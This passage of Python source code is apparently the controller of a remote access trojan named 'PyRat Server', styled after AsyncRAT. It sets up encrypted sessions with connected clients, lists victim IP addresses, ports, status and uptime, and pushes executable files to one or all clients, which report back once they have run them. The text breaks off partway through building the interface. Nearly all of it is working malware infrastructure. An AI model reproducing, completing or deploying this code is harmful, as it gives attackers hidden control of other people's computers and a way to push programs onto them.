import socket
import os
import struct
import threading
import secrets
import hashlib
import hmac
import logging
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
from dotenv import load_dotenv
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QHBoxLayout, 
                            QWidget, QFileDialog, QTableWidget, QTableWidgetItem, QToolBar, QStatusBar, 
                            QSplitter, QLabel, QHeaderView, QMessageBox, QMenu, QAction, QSystemTrayIcon,
                            QStyle, QStyleFactory, QGroupBox, QTabWidget, QSpinBox, QLineEdit, QComboBox,
                            QDateTimeEdit, QCheckBox, QFormLayout)
from PyQt5.QtCore import pyqtSignal, QThread, Qt, QObject, QMetaObject, Q_ARG, pyqtSlot, QTimer, QSize, QDateTime
from PyQt5.QtGui import QFont, QIcon, QColor, QPalette, QLinearGradient, QGradient

import sys
import time
from typing import Optional, Tuple
import tempfile
from plugins import PluginManager, Plugin, FilePlugin, ScriptPlugin
import select

# Setup logging with rotation
from logging.handlers import RotatingFileHandler
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler('server.log', maxBytes=1024*1024, backupCount=5)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
console_handler = logging.StreamHandler()
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

# Load configuration
load_dotenv(override=True)  # Force reload of environment variables

# Debug environment variables
logger.info("Current working directory: %s", os.getcwd())
logger.info("Environment variables loaded:")
logger.info("SERVER_HOST: %s", os.getenv('SERVER_HOST'))
logger.info("SERVER_PORT: %s", os.getenv('SERVER_PORT'))
logger.info("SERVER_PASSPHRASE: %s", "Set" if os.getenv('SERVER_PASSPHRASE') else "Not Set")

HOST = os.getenv('SERVER_HOST', '127.0.0.1')
PORT = int(os.getenv('SERVER_PORT', 12345))
SERVER_PASSPHRASE = os.getenv('SERVER_PASSPHRASE')

if not SERVER_PASSPHRASE:
    # Try to load from .env file directly
    try:
        with open('.env', 'r') as f:
            for line in f:
                if line.startswith('SERVER_PASSPHRASE='):
                    SERVER_PASSPHRASE = line.split('=', 1)[1].strip()
                    break
    except Exception as e:
        logger.error(f"Error reading .env file: {e}")

if not SERVER_PASSPHRASE:
    raise ValueError("SERVER_PASSPHRASE environment variable is required. Please check your .env file.")

SERVER_PASSPHRASE = SERVER_PASSPHRASE.encode()

# Security constants
MAX_CLIENTS = 50
RATE_LIMIT = 10  # requests per minute
BLOCK_DURATION = 300  # 5 minutes
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_FILE_TYPES = {'.exe', '.bin'}  # Whitelist of allowed file extensions
BUFFER_SIZE = 4096
CONNECTION_TIMEOUT = 30  # Increased from 10 to 30 seconds
HEARTBEAT_INTERVAL = 30  # seconds

# Constants
FRAME_HEADER = struct.Struct('!I')

# Derive AES key from server passphrase
SALT = secrets.token_bytes(16)
BASE_KEY = PBKDF2(SERVER_PASSPHRASE, SALT, dkLen=32, count=100000)

class SecurityError(Exception):
    """Base class for security-related exceptions"""
    pass

def encrypt_data(data: bytes, key: bytes) -> bytes:
    """Encrypt data using AES-GCM with built-in authentication."""
    nonce = secrets.token_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext

def decrypt_data(encrypted_data: bytes, key: bytes) -> bytes:
    """Decrypt data using AES-GCM with built-in authentication."""
    nonce = encrypted_data[:12]
    tag = encrypted_data[12:28]
    ciphertext = encrypted_data[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def compute_hmac(data: bytes, key: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def perform_dh_key_exchange(conn: socket.socket) -> bytes:
    try:
        # Set timeout to prevent hanging
        conn.settimeout(15) # Increased from 10 to 15 seconds
        
        # Configure socket with more moderate settings
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        # Use smaller buffer sizes to avoid overwhelming the network stack
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 32768) # Reduced from 65536
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32768) # Reduced from 65536
        
        if sys.platform == 'win32':
            try:
                conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
            except Exception as e:
                logger.warning(f"Failed to set SIO_KEEPALIVE_VALS: {e}")
        
        # Generate DH parameters and keys
        parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
        private_key = parameters.generate_private_key()
        public_key = private_key.public_key()
        
        param_bytes = parameters.parameter_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.ParameterFormat.PKCS3
        )
        pub_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # Send parameters with improved error handling and smaller chunks
        max_retries = 3
        retry_delay = 0.5  # Increased initial delay
        
        for attempt in range(max_retries):
            try:
                logger.info(f"Sending DH parameters to client (attempt {attempt+1})")
                
                # Send length header with proper error checking
                header = struct.pack('!I', len(param_bytes))
                total_sent = 0
                while total_sent < len(header):
                    sent = conn.send(header[total_sent:])
                    if sent == 0:
                        raise ConnectionError("Socket connection broken during header send")
                    total_sent += sent
                
                # Send parameters in smaller chunks with proper error handling
                chunk_size = 512  # Reduced from 1024
                total_sent = 0
                while total_sent < len(param_bytes):
                    end_pos = min(total_sent + chunk_size, len(param_bytes))
                    chunk = param_bytes[total_sent:end_pos]
                    try:
                        sent = conn.send(chunk)
                        if sent == 0:
                            raise ConnectionError("Socket connection broken during parameter send")
                        total_sent += sent
                        # Small delay between chunks to prevent overwhelming socket buffers
                        time.sleep(0.002)  # 2ms delay between chunks
                    except Exception as chunk_err:
                        logger.error(f"Error sending parameter chunk: {chunk_err}")
                        raise
                
                logger.info("Successfully sent DH parameters")
                break  # Exit retry loop if successful
            
            except (socket.error, ConnectionError) as e:
                logger.warning(f"Error sending parameters (attempt {attempt+1}): {e}")
                if attempt == max_retries - 1:
                    raise SecurityError(f"Failed to send parameters after {max_retries} attempts: {e}")
                
                # Try to verify if socket is still connected before retrying
                try:
                    # Check if socket is closed by trying to peek at incoming data
                    ready = select.select([conn], [], [], 0.1)
                    if ready[0]:
                        peek_data = conn.recv(1, socket.MSG_PEEK)
                        if not peek_data:  # Socket closed
                            raise ConnectionError("Socket appears to be closed")
                except Exception:
                    # If any error occurs during check, assume connection is broken
                    raise ConnectionError("Connection verification failed")
                
                # If we got here, connection seems viable, so sleep and retry
                time.sleep(retry_delay)
                retry_delay *= 1.5  # More gradual backoff

        # Send public key with similar improvements
        retry_delay = 0.5
        for attempt in range(max_retries):
            try:
                logger.info(f"Sending DH public key to client (attempt {attempt+1})")
                
                # Send length header
                header = struct.pack('!I', len(pub_bytes))
                total_sent = 0
                while total_sent < len(header):
                    sent = conn.send(header[total_sent:])
                    if sent == 0:
                        raise ConnectionError("Socket connection broken during header send")
                    total_sent += sent
                
                # Send public key in chunks
                chunk_size = 512
                total_sent = 0
                while total_sent < len(pub_bytes):
                    end_pos = min(total_sent + chunk_size, len(pub_bytes))
                    chunk = pub_bytes[total_sent:end_pos]
                    sent = conn.send(chunk)
                    if sent == 0:
                        raise ConnectionError("Socket connection broken during public key send")
                    total_sent += sent
                    time.sleep(0.002)  # 2ms delay between chunks
                
                logger.info("Successfully sent DH public key")
                break  # Exit retry loop if successful
            
            except (socket.error, ConnectionError) as e:
                logger.warning(f"Error sending public key (attempt {attempt+1}): {e}")
                if attempt == max_retries - 1:
                    raise SecurityError(f"Failed to send public key after {max_retries} attempts: {e}")
                time.sleep(retry_delay)
                retry_delay *= 1.5
        
        # Receive client's public key with retry logic
        retry_delay = 0.5
        client_pub_bytes = None  # Initialize outside the loop
        
        for attempt in range(max_retries):
            try:
                logger.info(f"Receiving client public key (attempt {attempt+1})")
                
                # Receive header
                header = b''
                bytes_received = 0
                while bytes_received < 4:
                    chunk = conn.recv(4 - bytes_received)
                    if not chunk:
                        raise ConnectionError("Connection closed while receiving header")
                    header += chunk
                    bytes_received += len(chunk)
                
                pub_len = struct.unpack('!I', header)[0]
                if pub_len > 4096:  # Sanity check
                    raise SecurityError("Invalid client public key size")
                
                # Receive public key in smaller chunks
                client_pub_bytes = b''
                bytes_received = 0
                while bytes_received < pub_len:
                    max_chunk = min(512, pub_len - bytes_received)  # Never read more than needed
                    chunk = conn.recv(max_chunk)
                    if not chunk:
                        raise ConnectionError("Connection closed during key reception")
                    client_pub_bytes += chunk
                    bytes_received += len(chunk)
                    time.sleep(0.001)  # Small delay between reads
                
                if len(client_pub_bytes) != pub_len:
                    raise SecurityError("Incomplete client public key received")
                
                logger.info("Successfully received client public key")
                break  # Exit retry loop if successful
                
            except (socket.error, ConnectionError) as e:
                logger.warning(f"Error receiving client public key (attempt {attempt+1}): {e}")
                if attempt == max_retries - 1:
                    raise SecurityError(f"Failed to receive client public key after {max_retries} attempts: {e}")
                time.sleep(retry_delay)
                retry_delay *= 1.5
        
        try:
            logger.info("Loading client public key and computing shared secret")
            client_pub_key = serialization.load_pem_public_key(client_pub_bytes, backend=default_backend())
            shared_secret = private_key.exchange(client_pub_key)
            session_key = hashlib.sha256(shared_secret).digest()
            logger.info("DH key exchange completed successfully")
            return session_key
        except Exception as e:
            logger.error(f"Failed to generate session key: {e}")
            raise SecurityError(f"Failed to generate session key: {e}")
            
    except Exception as e:
        logger.error(f"DH key exchange failed: {e}")
        raise SecurityError(f"Key exchange failed: {e}")
    finally:
        # Reset timeout to default
        try:
            conn.settimeout(None)
        except:
            pass  # Socket might be closed already

def send_framed_message(conn: socket.socket, data: bytes, key: bytes) -> None:
    """Send a framed message with built-in authentication."""
    try:
        # Encrypt the data with AES-GCM
        encrypted_data = encrypt_data(data, key)
        
        # Create the message with length prefix
        message = FRAME_HEADER.pack(len(encrypted_data)) + encrypted_data
        
        # Send the complete message
        conn.sendall(message)
    except Exception as e:
        logger.error(f"Error sending framed message: {e}")
        raise

def send_file(conn: socket.socket, file_path: str, key: bytes) -> bool:
    try:
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
            
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            raise SecurityError(f"File too large: {file_size} bytes")
            
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        file_hash = hashlib.sha256(file_data).hexdigest()
        
        # Send file hash
        encrypted_hash = encrypt_data(file_hash.encode(), key)
        conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
        
        # Send file size
        encrypted_size = encrypt_data(struct.pack('!Q', len(file_data)), key)
        conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
        
        # Send encrypted file
        encrypted_file = encrypt_data(file_data, key)
        conn.sendall(FRAME_HEADER.pack(len(encrypted_file)) + encrypted_file)
        
        return True
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        return False

class SignalHandler(QObject):
    log_signal = pyqtSignal(str)
    add_client_signal = pyqtSignal(tuple)
    remove_client_signal = pyqtSignal(tuple)
    update_client_status_signal = pyqtSignal(tuple, str)
    update_gui_signal = pyqtSignal()  # New signal for GUI updates

class ClientHandler(QThread):
    def __init__(self, conn: socket.socket, addr: tuple, signal_handler: SignalHandler):
        super().__init__()
        self.conn = conn
        self.addr = addr
        self.signal_handler = signal_handler
        self.session_key = None
        self.running = True
        self.last_heartbeat = datetime.now()
        self.heartbeat_timeout = 90
        
    def run(self):
        try:
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if sys.platform == 'win32':
                self.conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
            self.conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)

            # 1. Add client to GUI first (this will also set initial status via _add_client_impl)
            QMetaObject.invokeMethod(self.signal_handler, "add_client_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(tuple, self.addr))
            # Short delay to allow GUI to process the add_client_signal before key exchange potentially fails fast
            # This is a pragmatic way to reduce race conditions in queued GUI updates.
            time.sleep(0.1) 

            # 2. Perform key exchange
            QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(tuple, self.addr),
                                   Q_ARG(str, "Key Exchange...")) # More specific status
            try:
                self.session_key = perform_dh_key_exchange(self.conn)
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Authenticated"))
            except SecurityError as e:
                logger.error(f"Key exchange failed for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Failed"))
                # No return here, finally block will handle removal if needed
                # but we mark it as not running so the main loop doesn't start
                self.running = False 
            except socket.timeout as e:
                logger.error(f"Key exchange timed out for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Timeout"))
                self.running = False
            except Exception as e:
                logger.error(f"Unexpected error during key exchange for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Error"))
                self.running = False
            
            if not self.running: # If key exchange failed
                 # The finally block will emit remove_client_signal
                return
            
            # Set socket to non-blocking after key exchange
            self.conn.setblocking(False)
            
            # Use a buffer for messages to reduce GUI updates
            message_buffer = []
            last_update = time.time()
            update_interval = 0.1  # Update GUI every 100ms
            
            while self.running:
                try:
                    # Check for heartbeat timeout
                    if (datetime.now() - self.last_heartbeat).total_seconds() > self.heartbeat_timeout:
                        logger.warning(f"Client {self.addr} heartbeat timeout")
                        break

                    # Use select with a short timeout
                    ready = select.select([self.conn], [], [], 0.1)
                    if not ready[0]:
                        continue

                    try:
                        header = self.conn.recv(4)
                        if not header:
                            break
                            
                        length = struct.unpack('!I', header)[0]
                        if length > MAX_FILE_SIZE:
                            raise SecurityError("Message size exceeds maximum allowed size")
                        
                        # Read all data at once
                        encrypted_data = self.conn.recv(length)
                        if len(encrypted_data) != length:
                            raise SecurityError("Incomplete message received")
                        
                        message = decrypt_data(encrypted_data, self.session_key).decode()
                        self.last_heartbeat = datetime.now()
                        
                        if message == "HEARTBEAT":
                            # Respond to heartbeat immediately
                            send_framed_message(self.conn, b"HEARTBEAT", self.session_key)
                            message_buffer.append(("update_status", "Connected"))
                        elif message == "EXECUTED":
                            message_buffer.append(("update_status", "Executed"))
                        else:
                            message_buffer.append(("log", message))
                            
                        # Batch GUI updates
                        current_time = time.time()
                        if current_time - last_update >= update_interval and message_buffer:
                            self._process_message_buffer(message_buffer)
                            message_buffer = []
                            last_update = current_time
                            
                    except BlockingIOError:
                        continue
                    except Exception as e:
                        logger.error(f"Error processing message from {self.addr}: {e}")
                        break
                        
                except Exception as e:
                    logger.error(f"Error in client loop for {self.addr}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error with client {self.addr}: {e}")
        finally:
            try:
                self.conn.close()
            except:
                pass
            QMetaObject.invokeMethod(self.signal_handler, "remove_client_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(tuple, self.addr))

    def stop_thread(self):
        logger.debug(f"Stopping ClientHandler thread for {self.addr}...")
        self.running = False
        if self.conn:
            try:
                self.conn.shutdown(socket.SHUT_RDWR)
            except (socket.error, OSError):
                pass # Socket might already be closed or in a bad state
            finally:
                try:
                    self.conn.close()
                except (socket.error, OSError):
                    pass # Ignore further errors on close
        self.quit() # Request QThread's event loop to exit (if it was started)
        logger.debug(f"ClientHandler thread for {self.addr} signaled to stop.")

    def _process_message_buffer(self, message_buffer):
        """Process buffered messages in a single GUI update"""
        try:
            for msg_type, content in message_buffer:
                if msg_type == "update_status":
                    QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(tuple, self.addr),
                                           Q_ARG(str, content))
                elif msg_type == "log":
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(str, f"Client {self.addr}: {content}"))
        except Exception as e:
            logger.error(f"Error processing message buffer: {e}")

    def send_file_to_client(self, file_path: str) -> bool:
        if not os.path.exists(file_path):
            logger.error(f"File {file_path} not found")
            return False
            
        try:
            if not self.session_key:
                logger.error(f"No session key for {self.addr}")
                return False
                
            command = b"FILE_TRANSFER"
            encrypted_command = encrypt_data(command, self.session_key)
            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_command)) + encrypted_command)
            
            if send_file(self.conn, file_path, self.session_key):
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Sending File"))
                return True
            else:
                logger.error(f"Failed to send file {file_path} to {self.addr}")
                return False
        except Exception as e:
            logger.error(f"Error sending file to {self.addr}: {e}")
            return False

class RateLimiter:
    def __init__(self, limit: int, window: int):
        self.limit = limit
        self.window = window
        self.requests = {}
        self.blocked = {}

    def is_allowed(self, addr: tuple) -> bool:
        current_time = time.time()
        
        # Check if IP is blocked
        if addr in self.blocked:
            if current_time - self.blocked[addr] < BLOCK_DURATION:
                return False
            del self.blocked[addr]
        
        # Clean old requests
        if addr in self.requests:
            self.requests[addr] = [t for t in self.requests[addr] if current_time - t < self.window]
        else:
            self.requests[addr] = []
        
        # Check rate limit
        if len(self.requests[addr]) >= self.limit:
            self.blocked[addr] = current_time
            return False
        
        self.requests[addr].append(current_time)
        return True

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.rate_limiter = RateLimiter(RATE_LIMIT, 60)
        self.lock = threading.Lock()

    def add_client(self, addr: tuple, handler: 'ClientHandler') -> bool:
        with self.lock:
            if len(self.clients) >= MAX_CLIENTS:
                return False
            if not self.rate_limiter.is_allowed(addr):
                return False
            self.clients[addr] = handler
            return True

    def remove_client(self, addr: tuple):
        with self.lock:
            if addr in self.clients:
                del self.clients[addr]

    def get_client(self, addr: tuple) -> Optional['ClientHandler']:
        with self.lock:
            return self.clients.get(addr)

    def get_all_clients(self) -> dict:
        with self.lock:
            return self.clients.copy()

class FileSenderThread(QThread):
    def __init__(self, client_manager: ClientManager, file_path: str, signal_handler: SignalHandler, addr: tuple = None):
        super().__init__()
        self.client_manager = client_manager
        self.file_path = file_path
        self.signal_handler = signal_handler
        self.addr = addr
        self.finished.connect(self.deleteLater)  # Ensure proper cleanup

    def run(self):
        try:
            if self.addr:
                client = self.client_manager.get_client(self.addr)
                if client:
                    client.send_file_to_client(self.file_path)
            else:
                for addr, client in self.client_manager.get_all_clients().items():
                    client.send_file_to_client(self.file_path)
        except Exception as e:
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Error sending file: {e}"))

class ServerThread(QThread):
    def __init__(self, signal_handler: SignalHandler):
        super().__init__()
        self.signal_handler = signal_handler
        self.client_manager = ClientManager()
        self.server = None
        self.running = True
        self.lock = threading.Lock()
        self.file_sender_threads = []

    def run(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if sys.platform == 'win32':
                self.server.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
            self.server.bind((HOST, PORT))
            self.server.listen(MAX_CLIENTS)
            self.server.setblocking(False)  # Set non-blocking mode
            
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Server listening on {HOST}:{PORT}"))
            
            while self.running:
                try:
                    # Use select with a short timeout
                    ready = select.select([self.server], [], [], 0.1)
                    if not ready[0]:
                        continue

                    try:
                        conn, addr = self.server.accept()
                        
                        if not self.client_manager.rate_limiter.is_allowed(addr):
                            conn.close()
                            continue
                        
                        client_handler = ClientHandler(conn, addr, self.signal_handler)
                        if self.client_manager.add_client(addr, client_handler):
                            client_handler.start()
                    except BlockingIOError:
                        continue
                    except Exception as e:
                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                               Qt.QueuedConnection,
                                               Q_ARG(str, f"Error accepting connection: {e}"))
                        continue
                        
                except Exception as e:
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(str, f"Server loop error: {e}"))
                    continue
                    
        except Exception as e:
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Server error: {e}"))
        finally:
            if self.server:
                try:
                    self.server.close()
                except:
                    pass
            logger.info("ServerThread run method finished.")

    def stop(self):
        logger.info("ServerThread.stop() called.")
        self.running = False # Stop server loop from accepting new connections

        if self.server:
            try:
                self.server.close() # Close main server socket early
                logger.info("Main server socket closed.")
            except Exception as e:
                logger.error(f"Error closing server socket: {e}")

        # Gracefully stop all client handlers
        client_handlers_copy = list(self.client_manager.get_all_clients().values())
        logger.info(f"Attempting to stop {len(client_handlers_copy)} client handlers...")
        for handler in client_handlers_copy:
            try:
                logger.debug(f"Stopping client handler for {getattr(handler, 'addr', 'N/A')}...")
                if hasattr(handler, 'stop_thread'):
                    handler.stop_thread() # Signal to stop its loop and close its socket
                else: # Fallback if stop_thread is missing for some reason
                    handler.running = False
                    if handler.conn:
                        try: handler.conn.close()
                        except: pass
                
                if handler.isRunning():
                    if not handler.wait(1000): # Wait for 1 second for each client thread
                        logger.warning(f"Client handler {getattr(handler, 'addr', 'N/A')} did not terminate in time.")
                logger.debug(f"Client handler for {getattr(handler, 'addr', 'N/A')} processed for shutdown.")
            except Exception as e:
                logger.error(f"Error during shutdown of client handler {getattr(handler, 'addr', 'N/A')}: {e}")
        logger.info(f"Finished attempting to stop client handlers.")
        
        # Wait for all file sender threads to finish
        threads_to_wait = list(self.file_sender_threads) # Make a copy
        logger.info(f"Attempting to wait for {len(threads_to_wait)} file sender threads...")
        for thread in threads_to_wait:
            try:
                if thread.isRunning():
                    if not thread.wait(1000): # Wait with timeout
                        logger.warning("A file sender thread did not terminate in time.")
            except Exception as e:
                logger.error(f"Error waiting for file sender thread: {e}")
        logger.info("Finished waiting for file sender threads.")

        logger.info("Stopping ServerThread QThread instance itself...")
        self.quit() # For QThread's event loop, if it were used by a subclass not overriding run()
        if self.isRunning():
            if not self.wait(3000): # Wait for ServerThread's run() method to exit
                logger.warning("ServerThread's run() method did not terminate in time.")
        logger.info("ServerThread.stop() finished.")

    def send_file_to_client(self, file_path: str, addr: tuple = None):
        if not os.path.exists(file_path):
            self.signal_handler.log_signal.emit(f"File not found: {file_path}")
            return
            
        file_ext = os.path.splitext(file_path)[1].lower()
        if file_ext not in ALLOWED_FILE_TYPES:
            self.signal_handler.log_signal.emit(f"File type not allowed: {file_ext}")
            return
            
        if os.path.getsize(file_path) > MAX_FILE_SIZE:
            self.signal_handler.log_signal.emit(f"File too large: {file_path}")
            return
            
        sender_thread = FileSenderThread(self.client_manager, file_path, self.signal_handler, addr)
        self.file_sender_threads.append(sender_thread)  # Keep reference to thread
        sender_thread.finished.connect(lambda: self.file_sender_threads.remove(sender_thread))  # Remove when done
        sender_thread.start()

class LogType:
    CONNECTION = "Connection"
    FILE_TRANSFER = "File Transfer"
    COMMAND = "Command"
    SYSTEM = "System"
    ERROR = "Error"

class AutomationTask:
    def __init__(self, name, script, schedule, target_clients=None):
        self.name = name
        self.script = script
        self.schedule = schedule
        self.target_clients = target_clients or []
        self.last_run = None
        self.enabled = True

class ServerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.gui_lock = threading.Lock()
        self.setWindowTitle("PyRat Server")
        self.setGeometry(100, 100, 1400, 900)
        self.setFont(QFont("Segoe UI", 9))

        # Apply global dark theme stylesheet
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2E2E2E;
            }
            QWidget {
                background-color: #2E2E2E;
                color: #E0E0E0;
                font-family: 'Segoe UI', Arial, sans-serif;
                font-size: 9pt;
            }
            QTableWidget {
                background-color: #252525;
                color: #E0E0E0;
                gridline-color: #3A3A3A;
                border: 1px solid #3A3A3A;
                selection-background-color: #007ACC; /* Bright blue for selection */
                selection-color: #FFFFFF;
            }
            QTableWidget::item {
                padding: 6px;
                border-bottom: 1px solid #3A3A3A;
            }
            QHeaderView::section {
                background-color: #3A3A3A;
                color: #E0E0E0;
                padding: 6px;
                border: none;
                border-bottom: 1px solid #4A4A4A;
                font-weight: bold;
            }
            QPushButton {
                background-color: #007ACC;
                color: white;
                border: 1px solid #005C9E;
                padding: 6px 12px;
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #005C9E;
            }
            QPushButton:pressed {
                background-color: #004C80;
            }
            QPushButton:disabled {
                background-color: #4A4A4A;
                color: #8E8E8E;
            }
            QTextEdit {
                background-color: #252525;
                color: #E0E0E0;
                border: 1px solid #3A3A3A;
                font-family: 'Consolas', 'Courier New', monospace;
            }
            QStatusBar {
                background-color: #1E1E1E;
                color: #E0E0E0;
                border-top: 1px solid #3A3A3A;
            }
            QLabel {
                color: #E0E0E0;
            }
            QToolBar {
                background-color: #2E2E2E;
                border-bottom: 1px solid #3A3A3A;
                spacing: 5px;
            }
            QToolBar QToolButton {
                background-color: transparent;
                color: #E0E0E0;
                border: none;
                padding: 5px;
            }
            QToolBar QToolButton:hover {
                background-color: #3A3A3A;
            }
            QToolBar QToolButton:pressed {
                background-color: #4A4A4A;
            }
            QMenu {
                background-color: #2E2E2E;
                color: #E0E0E0;
                border: 1px solid #3A3A3A;
            }
            QMenu::item {
                padding: 8px 20px;
            }
            QMenu::item:selected {
                background-color: #007ACC;
            }
            QMenu::separator {
                height: 1px;
                background-color: #3A3A3A;
                margin-left: 5px;
                margin-right: 5px;
            }
            QScrollBar:vertical {
                border: none;
                background: #252525;
                width: 12px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #4A4A4A;
                min-height: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
            QScrollBar:horizontal {
                border: none;
                background: #252525;
                height: 12px;
                margin: 0px;
            }
            QScrollBar::handle:horizontal {
                background: #4A4A4A;
                min-width: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
                width: 0px;
            }
        """)

        # Initialize logging components first
        self.log_table = None
        self.client_table = None
        self.task_table = None
        self.automation_tasks = []
        self.system_info = None
        
        # Initialize signal handler first
        self.signal_handler = SignalHandler()
        self.signal_handler.log_signal.connect(self.append_log)
        self.signal_handler.add_client_signal.connect(self.add_client)
        self.signal_handler.remove_client_signal.connect(self.remove_client)
        self.signal_handler.update_client_status_signal.connect(self.update_client_status)
        self.signal_handler.update_gui_signal.connect(self.update_gui)
        
        # Initialize GUI components
        self.init_gui()
        
        # Initialize server thread
        self.server_thread = ServerThread(self.signal_handler)
        
        # Start server thread
        self.server_thread.start()
        
        # Initialize other variables
        self.client_count = 0
        self.clients = {}
        self.pending_updates = []
        self.last_update = time.time()
        self.update_interval = 0.05  # Update GUI every 50ms for better responsiveness
        
        # Set up system tray
        self.setup_tray_icon()
        
        # Set window icon
        self.setWindowIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        # Start GUI update timer with higher priority
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.process_pending_updates)
        self.update_timer.start(50)  # Update every 50ms for better responsiveness
        
        # Set process priority
        if sys.platform == 'win32':
            try:
                import win32api, win32process, win32con
                pid = win32api.GetCurrentProcessId()
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
                win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
            except:
                pass

    def init_gui(self):
        """Initialize the GUI components with a dark, AsyncRAT-like theme"""
        self.setWindowTitle("PyRat Server")
        self.setGeometry(100, 100, 1400, 900)
        self.setFont(QFont("Segoe UI", 9))

        # Create central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)

        # --- Main Content Area (Splitter) ---
        splitter = QSplitter(Qt.Vertical)
        splitter.setStyleSheet("QSplitter::handle { background-color: #3A3A3A; }")
        splitter.setHandleWidth(2)

        # Client Table Section
        client_section_widget = QWidget()
        client_layout = QVBoxLayout(client_section_widget)
        client_layout.setContentsMargins(5, 5, 5, 5)
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(6)
        self.client_table.setHorizontalHeaderLabels([
            "IP Address", "Port", "Status", "Connect Time", "Uptime", "Actions"
        ])
        self.client_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
